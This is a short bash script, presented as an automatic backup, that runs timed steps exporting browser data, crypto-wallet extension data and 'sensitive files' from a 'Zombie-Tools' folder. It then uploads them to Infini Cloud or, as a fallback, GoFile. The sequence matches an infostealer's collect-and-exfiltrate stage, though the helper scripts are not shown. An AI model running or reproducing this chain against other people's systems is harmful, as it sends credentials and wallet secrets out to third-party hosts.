#!/usr/bin/env bash

# 每个子脚本的最大运行时间，单位为秒；可通过环境变量覆盖。
TIMEOUT_SECONDS="${TIMEOUT_SECONDS:-600}"

run_step() {
    local name="$1"
    shift

    echo "[autobackup] 开始：${name}"
    "$@" &
    local pid=$!
    local elapsed=0

    while kill -0 "$pid" 2>/dev/null; do
        if (( elapsed >= TIMEOUT_SECONDS )); then
            echo "[autobackup] 超时，终止并继续：${name}" >&2
            kill "$pid" 2>/dev/null || true
            wait "$pid" 2>/dev/null || true
            return 124
        fi
        sleep 1
        ((elapsed += 1))
    done

    if wait "$pid"; then
        echo "[autobackup] 完成：${name}"
        return 0
    fi

    local exit_code=$?
    echo "[autobackup] 失败（退出码 ${exit_code}），继续：${name}" >&2
    return "$exit_code"
}

zombie_tools="${HOME}/Zombie-Tools"

run_step '浏览器数据备份' \
    python3 "${zombie_tools}/备份/备份浏览器数据/linux/export_browser_data.py" || true

run_step '钱包扩展数据备份' \
    python3 "${zombie_tools}/备份/备份钱包扩展数据/linux/backup-wallet-ext.py" || true

run_step '敏感文件备份' \
    bash "${zombie_tools}/备份/备份敏感文件/backup-sensitive.sh" || true

if run_step 'Infini Cloud 上传' \
    python3 "${zombie_tools}/上传/infini-cloud/upload.py" --auto-backup; then
    :
else
    echo '[autobackup] Infini Cloud 失败，回退到 GoFile' >&2
    run_step 'GoFile 上传' \
        python3 "${zombie_tools}/上传/gofile/upload.py" --auto-backup || true
fi

echo '[autobackup] 所有步骤已处理。'
